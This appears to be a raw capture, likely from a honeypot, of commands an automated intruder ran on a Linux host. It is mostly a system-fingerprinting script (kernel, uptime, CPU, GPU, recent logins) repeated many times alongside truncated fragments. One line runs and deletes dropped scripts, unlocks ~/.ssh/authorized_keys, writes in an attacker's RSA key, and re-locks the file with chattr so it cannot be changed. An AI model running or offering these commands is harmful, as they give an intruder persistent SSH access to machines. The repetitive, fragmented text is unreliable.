head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
